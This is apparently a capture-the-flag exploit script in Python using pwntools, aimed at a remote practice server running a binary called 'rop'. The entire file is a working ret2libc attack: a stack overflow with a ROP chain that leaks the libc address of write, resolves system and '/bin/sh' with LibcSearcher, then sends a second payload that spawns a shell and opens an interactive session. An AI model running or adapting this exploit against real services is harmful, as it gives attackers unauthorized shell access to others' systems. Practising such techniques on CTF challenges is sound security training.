from pwn import *
from LibcSearcher import *
context.arch='i386'
# just leak the libc, and get shell

# p = process('./rop')
p = remote('node3.buuoj.cn',28307)
elf = ELF('./rop',checksec=False)

write_plt = elf.plt['write']
write_got = elf.got['write']
main = elf.sym['main']
ret = 0x08048199 # ret

payload = 'A'*(0x88+4)
# payload += flat([write_plt, main, 1, write_got, 4])
payload += flat([ret, write_plt, main, 1, write_got, 4])
p.send(payload)
write_addr = u32(p.recv(4))
log.success('write_addr = %#x',write_addr)

libc = LibcSearcher('write',write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
log.info('system_addr = %#x, binsh = %#x'%(system_addr,binsh))

paylaod = "a"*(0x88+4)
# paylaod += flat([system_addr, main, binsh])
paylaod += flat([ret, system_addr, main, binsh])
p.send(paylaod)
sleep(1)
p.interactive()
